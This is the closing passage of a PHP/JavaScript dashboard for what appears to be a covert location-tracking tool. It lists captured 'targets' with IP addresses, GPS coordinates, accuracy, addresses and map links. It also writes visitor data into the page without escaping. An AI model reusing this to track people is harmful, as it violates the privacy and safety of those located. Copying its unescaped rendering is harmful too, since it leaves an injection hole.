                    <div><span class="text-slate-500">[<?php echo date('H:i:s'); ?> WIB]</span> <span class="text-white">GEO_STATS:</span> Top location: <span class="text-brand-400"><?php echo htmlspecialchars($topCity); ?></span>, <span class="text-brand-400"><?php echo htmlspecialchars($topCountry); ?></span></div>
                    <div class="mt-2"><span class="text-brand-500 bg-brand-500/20 animate-pulse px-1">_</span></div>
                </div>
            </div>
            
        <?php endif; ?>
    </div>

    <script>
    // State management for Pagination & Data
    let refreshInterval;
    let currentVisitorsData = [];
    let currentPage = 1;
    const rowsPerPage = 10;
    
    // Inisialisasi
    document.addEventListener('DOMContentLoaded', function() {
        <?php if ($authenticated): ?>
        startAutoRefresh();
        updateLiveTime();
        <?php endif; ?>
    });
    
    // Update live time
    function updateLiveTime() {
        setInterval(() => {
            const now = new Date();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            document.getElementById('liveTime').innerHTML = `${hours}:${minutes}:${seconds} WIB`;
        }, 1000);
    }
    
    // Auto refresh
    function startAutoRefresh() {
        if (refreshInterval) clearInterval(refreshInterval);
        refreshInterval = setInterval(fetchData, 3000);
    }
    
    // Fetch data
    async function fetchData() {
        try {
            const response = await fetch('nausr.php?api=get_data&t=' + Date.now());
            const result = await response.json();
            
            if (result.success) {
                updateUI(result.data);
            }
        } catch (error) {
            console.error('Error:', error);
        }
    }
    
    // Refresh manual
    function refreshData() {
        fetchData();
        showNotification('Data synchronized', 'success');
    }
    
    // Update UI Wrapper
    function updateUI(data) {
        currentVisitorsData = data.visitors || [];
        const stats = data.stats;
        
        // Cek halaman jika data terhapus dan halamannya kosong
        const maxPage = Math.ceil(currentVisitorsData.length / rowsPerPage);
        if (currentPage > maxPage && maxPage > 0) currentPage = maxPage;
        if (currentPage < 1) currentPage = 1;
        
        // Update stats top
        document.getElementById('total').textContent = stats.total;
        document.getElementById('unique').textContent = stats.unique;
        document.getElementById('gps').textContent = stats.gps_count;
        document.getElementById('ip').textContent = stats.ip_count;
        document.getElementById('topCountry').textContent = stats.top_country.length > 15 ? stats.top_country.substring(0, 12) + '...' : stats.top_country;
        document.getElementById('topCity').textContent = stats.top_city.length > 15 ? stats.top_city.substring(0, 12) + '...' : stats.top_city;
        document.getElementById('lastUpdate').innerHTML = stats.last_update ? 
            new Date(stats.last_update).toLocaleTimeString('id-ID', { hour12: false }) + ' WIB' : '-';
        document.getElementById('totalRecords').textContent = stats.total;
        
        updateTable(); // Fungsi yang sudah menggunakan pagination
        updateDebugLog(currentVisitorsData.length, stats.gps_count, stats.avg_accuracy, stats.top_city, stats.top_country);
    }
    
    // Ganti Halaman
    function changePage(page) {
        const maxPage = Math.ceil(currentVisitorsData.length / rowsPerPage);
        if (page < 1 || page > maxPage) return;
        currentPage = page;
        updateTable();
    }
    
    // Update Table dengan Pagination Client-side
    function updateTable() {
        const tbody = document.getElementById('table-body');
        const visitors = currentVisitorsData;
        
        if (visitors.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="8" class="px-6 py-16 text-center text-slate-500">
                        <div class="flex flex-col items-center gap-3">
                            <div class="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center text-slate-600 mb-2"><i class="ph ph-ghost text-3xl"></i></div>
                            <p class="font-medium text-white">No signals intercepted yet</p>
                            <p class="text-xs font-mono text-slate-500">Listening on port... awaiting incoming data stream.</p>
                        </div>
                    </td>
                </tr>
            `;
            document.getElementById('pagination-container').innerHTML = '';
            return;
        }
        
        // Hitung index untuk slicing array (pagination)
        const totalPages = Math.ceil(visitors.length / rowsPerPage);
        const startIndex = (currentPage - 1) * rowsPerPage;
        const endIndex = startIndex + rowsPerPage;
        const paginatedVisitors = visitors.slice(startIndex, endIndex);
        
        let html = '';
        paginatedVisitors.forEach((v, idx) => {
            const absoluteIndex = startIndex + idx; // Index asli untuk fungsi hapus
            
            const source = v.source || 'ip';
            const sourceClass = source === 'gps' ? 'bg-brand-500/10 text-brand-400 border-brand-500/20' : 'bg-blue-500/10 text-blue-400 border-blue-500/20';
            const sourceIcon = source === 'gps' ? 'ph-crosshair' : 'ph-globe';
            const sourceText = source === 'gps' ? 'GPS' : 'IP';
            
            // Akurasi badge
            let accBadge = '';
            if (v.accuracy && v.accuracy > 0) {
                let accClass = 'accuracy-medium';
                if (v.accuracy < 20) accClass = 'accuracy-high';
                else if (v.accuracy > 100) accClass = 'accuracy-low';
                accBadge = `<span class="accuracy-badge ${accClass}">±${v.accuracy}m</span>`;
            } else {
                accBadge = '<span class="text-slate-600 text-xs">-</span>';
            }
            
            // Waktu WIB
            const waktuWIB = v.timestamp ? new Date(v.timestamp).toLocaleTimeString('id-ID', { 
                timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
            }) : '-';
            
            const tanggalWIB = v.timestamp ? new Date(v.timestamp).toLocaleDateString('id-ID', { 
                timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: 'numeric'
            }) : '-';
            
            html += `<tr class="hover:bg-brand-500/[0.03] transition-colors group border-b border-white/5 last:border-0">`;
            html += `<td class="px-6 py-4 text-slate-500 font-mono text-xs">${String(absoluteIndex + 1).padStart(2, '0')}</td>`;
            html += `<td class="px-6 py-4 font-mono whitespace-nowrap time-wib">${waktuWIB} <span class="text-[10px] font-sans font-bold text-slate-500 ml-1 tracking-wider">WIB</span><div class="text-[10px] text-slate-600">${tanggalWIB}</div></td>`;
            html += `<td class="px-6 py-4 font-mono text-brand-400 font-medium tracking-wide">${v.ip_address || '-'}</td>`;
            html += `<td class="px-6 py-4"><span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md ${sourceClass} text-[11px] font-bold tracking-wide border"><i class="ph ${sourceIcon}"></i> ${sourceText}</span></td>`;
            html += `<td class="px-6 py-4">${accBadge}</td>`;
            html += `<td class="px-6 py-4"><div class="text-slate-200 font-medium text-sm mb-0.5">${v.city || '-'}, <span class="text-slate-400">${v.country || '-'}</span></div><div class="text-xs text-slate-500 truncate max-w-[300px]" title="${v.full_address || ''}">${(v.full_address || '-').substring(0, 45)}...</div></td>`;
            
            if (v.latitude && Math.abs(v.latitude) > 0.1) {
                html += `<td class="px-6 py-4 font-mono text-xs text-slate-400 bg-white/[0.01] border-l border-r border-white/5"><div>${Number(v.latitude).toFixed(6)}</div><div class="text-slate-600">${Number(v.longitude).toFixed(6)}</div></td>`;
            } else {
                html += `<td class="px-6 py-4 font-mono text-xs text-slate-400 bg-white/[0.01] border-l border-r border-white/5">-</td>`;
            }
            
            html += `<td class="px-6 py-4 text-center"><div class="flex items-center justify-center gap-2 opacity-50 group-hover:opacity-100 transition-opacity">`;
            if (v.google_maps_link) {
                html += `<a href="${v.google_maps_link}" target="_blank" class="flex items-center justify-center w-8 h-8 bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 hover:text-blue-300 rounded-lg transition-all border border-blue-500/20" title="Open in Maps"><i class="ph ph-map-trifold text-lg"></i></a>`;
            }
            // Kirim absoluteIndex ke fungsi hapus, bukan index dari halaman saat ini
            html += `<button onclick="deleteData(${absoluteIndex})" class="flex items-center justify-center w-8 h-8 bg-red-500/10 text-red-400 hover:bg-red-500/20 hover:text-red-300 rounded-lg transition-all border border-red-500/20" title="Delete Record"><i class="ph ph-trash text-lg"></i></button>`;
            html += `</div></td>`;
            html += `</tr>`;
        });
        
        tbody.innerHTML = html;
        renderPaginationUI(totalPages);
    }
    
    // Render UI Pagination Bottom
    function renderPaginationUI(totalPages) {
        const container = document.getElementById('pagination-container');
        
        if (totalPages <= 1) {
            container.innerHTML = '';
            return;
        }
        
        const startItem = (currentPage - 1) * rowsPerPage + 1;
        const endItem = Math.min(currentPage * rowsPerPage, currentVisitorsData.length);
        const totalItems = currentVisitorsData.length;
        
        let html = `
        <div class="flex flex-col sm:flex-row items-center justify-between px-6 py-4 gap-4">
            <div class="text-sm text-slate-400 text-center sm:text-left">
                Showing <span class="font-medium text-white">${startItem}</span> to <span class="font-medium text-white">${endItem}</span> of <span class="font-medium text-white">${totalItems}</span> targets
            </div>
            
            <div class="flex items-center gap-1 bg-dark-800/50 p-1 rounded-xl border border-white/5 shadow-inner">
                <button onclick="changePage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''} 
                    class="page-btn flex items-center justify-center w-8 h-8 rounded-lg text-slate-400 disabled:opacity-30 disabled:cursor-not-allowed">
                    <i class="ph ph-caret-left font-bold"></i>
                </button>
        `;
        
        // Logic menampilkan batas page number agar tidak kepanjangan (maksimal tampil sekitar 5 angka)
        let startPage = Math.max(1, currentPage - 2);
        let endPage = Math.min(totalPages, currentPage + 2);
        
        if (currentPage <= 3) {
            endPage = Math.min(totalPages, 5);
        } else if (currentPage >= totalPages - 2) {
            startPage = Math.max(1, totalPages - 4);
        }

        if (startPage > 1) {
            html += `<button onclick="changePage(1)" class="page-btn flex items-center justify-center min-w-[32px] h-8 px-2 rounded-lg text-sm text-slate-400">1</button>`;
            if (startPage > 2) html += `<span class="text-slate-600 px-1">...</span>`;
        }
        
        for (let i = startPage; i <= endPage; i++) {
            const activeClass = i === currentPage ? 'active' : 'text-slate-400';
            html += `<button onclick="changePage(${i})" class="page-btn ${activeClass} flex items-center justify-center min-w-[32px] h-8 px-2 rounded-lg text-sm border border-transparent">${i}</button>`;
        }
        
        if (endPage < totalPages) {
            if (endPage < totalPages - 1) html += `<span class="text-slate-600 px-1">...</span>`;
            html += `<button onclick="changePage(${totalPages})" class="page-btn flex items-center justify-center min-w-[32px] h-8 px-2 rounded-lg text-sm text-slate-400">${totalPages}</button>`;
        }
        
        html += `
                <button onclick="changePage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''} 
                    class="page-btn flex items-center justify-center w-8 h-8 rounded-lg text-slate-400 disabled:opacity-30 disabled:cursor-not-allowed">
                    <i class="ph ph-caret-right font-bold"></i>
                </button>
            </div>
        </div>`;
        
        container.innerHTML = html;
    }
    
    // Update debug log
    function updateDebugLog(total, gpsCount, avgAccuracy, topCity, topCountry) {
        const now = new Date();
        const waktu = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
        
        const debugLog = document.getElementById('debug-log');
        if (debugLog) {
            let html = `<div class="mb-1"><span class="text-blue-400">root@osint-core:~#</span> ./status_check.sh</div>`;
            html += `<div><span class="text-slate-500">[${waktu} WIB]</span> <span class="text-white">SYS_INFO:</span> Session validated</div>`;
            html += `<div><span class="text-slate-500">[${waktu} WIB]</span> <span class="text-white">MEM_CHECK:</span> ${total} target vectors loaded</div>`;
            html += `<div><span class="text-slate-500">[${waktu} WIB]</span> <span class="text-white">GPS_ACC:</span> Rata-rata akurasi <span class="text-brand-400">${avgAccuracy > 0 ? '±' + avgAccuracy + 'm' : 'N/A'}</span></div>`;
            html += `<div><span class="text-slate-500">[${waktu} WIB]</span> <span class="text-white">GEO_STATS:</span> Top location: <span class="text-brand-400">${topCity || '-'}</span>, <span class="text-brand-400">${topCountry || '-'}</span></div>`;
            html += `<div class="mt-2"><span class="text-brand-500 bg-brand-500/20 animate-pulse px-1">_</span></div>`;
            debugLog.innerHTML = html;
        }
    }
    
    // Delete data
    async function deleteData(index) {
        if (!confirm('Delete this record?')) return;
        
        const formData = new FormData();
        formData.append('delete', index);
        
        const response = await fetch('nausr.php', { method: 'POST', body: formData });
        const result = await response.json();
        
        if (result.success) {
            fetchData();
        }
    }
    
    // Reset all data
    async function resetData() {
        if (!confirm('⚠️ Delete ALL intelligence data? This action cannot be undone.')) return;
        
        const formData = new FormData();
        formData.append('reset', '1');
        
        const response = await fetch('nausr.php', { method: 'POST', body: formData });
        const result = await response.json();
        
        if (result.success) {
            fetchData();
        }
    }
    
    // Show notification (simple console)
    function showNotification(message, type = 'success') {
        console.log(`[${type.toUpperCase()}] ${message}`);
    }
    </script>
</body>
</html>